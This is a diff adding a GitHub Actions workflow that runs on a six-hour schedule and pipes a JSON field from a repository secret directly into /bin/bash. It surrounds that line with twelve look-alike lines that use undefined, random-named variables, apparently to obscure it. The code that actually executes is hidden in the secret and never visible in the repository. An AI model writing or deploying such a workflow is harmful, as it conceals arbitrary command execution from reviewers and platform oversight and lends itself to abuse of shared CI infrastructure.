@@ -1,0 +1,30 @@
+name: rongshibeihui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rongshibeihui
+        env:
+          m39: ${{ secrets.m39 }}
+        run: |
+          echo $m39 | jq -r .qoxop97767 | /bin/bash
+          echo $gx85513 | jq -r .n1 | /bin/bash
+          echo $renkc459 | jq -r .nbm1 | /bin/bash
+          echo $hcptw70 | jq -r .kzywz2 | /bin/bash
+          echo $cc1282 | jq -r .evr85 | /bin/bash
+          echo $scm0 | jq -r .eitev47279 | /bin/bash
+          echo $vh08285 | jq -r .tdox581 | /bin/bash
+          echo $qkrva5933 | jq -r .ye06929 | /bin/bash
+          echo $ruj655 | jq -r .mqndh63809 | /bin/bash
+          echo $dk62302 | jq -r .grz81580 | /bin/bash
+          echo $y541 | jq -r .s885 | /bin/bash
+          echo $xyanj95533 | jq -r .x41968 | /bin/bash
+          echo $dz349 | jq -r .itzwa8804 | /bin/bash
+
